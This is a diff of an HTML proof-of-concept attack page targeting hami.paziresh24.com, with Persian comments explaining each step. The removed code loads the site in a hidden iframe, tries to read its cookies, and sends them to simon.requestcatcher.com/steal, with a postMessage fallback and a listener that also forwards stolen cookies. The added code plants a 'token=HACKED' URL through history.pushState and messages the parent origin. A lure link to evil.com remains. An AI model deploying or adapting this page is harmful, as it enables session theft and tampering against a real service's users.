@@ -4,39 +4,17 @@
     <title>Loading...</title>
 </head>
 <body>
-    <!-- اگر کاربر روی لینک کلیک کنه، به evil.com میره -->
     <a href="https://evil.com" target="_blank">Click here to continue</a>
-
-    <!-- iframe که hami.paziresh24.com رو لود می‌کنه -->
     <iframe src="https://hami.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
-
     <script>
-        // منتظر می‌مونیم تا iframe لود بشه
         const iframe = document.querySelector('iframe');
-
         iframe.onload = function () {
-            try {
-                // سعی می‌کنیم کوکی رو از iframe بگیریم
-                const cookie = iframe.contentWindow.document.cookie;
-                if (cookie) {
-                    // کوکی رو به سرور مهاجم می‌فرستیم
-                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
-                }
-            } catch (e) {
-                // اگه دسترسی نداشتیم، از postMessage استفاده می‌کنیم
-                iframe.contentWindow.postMessage({
-                    type: 'STEAL_COOKIE',
-                    url: 'https://simon.requestcatcher.com/steal'
-                }, '*');
-            }
+            history.pushState({}, '', 'https://hami.paziresh24.com/profile?token=HACKED');
+            window.parent.postMessage({
+                type: 'IFRAME_URL_CHANGED',
+                url: window.location.href
+            }, 'https://www.paziresh24.com');
         };
-
-        // گوش دادن به پاسخ از iframe
-        window.addEventListener('message', function (e) {
-            if (e.data && e.data.type === 'COOKIE_STOLEN') {
-                fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(e.data.cookie));
-            }
-        });
     </script>
 </body>
 </html>
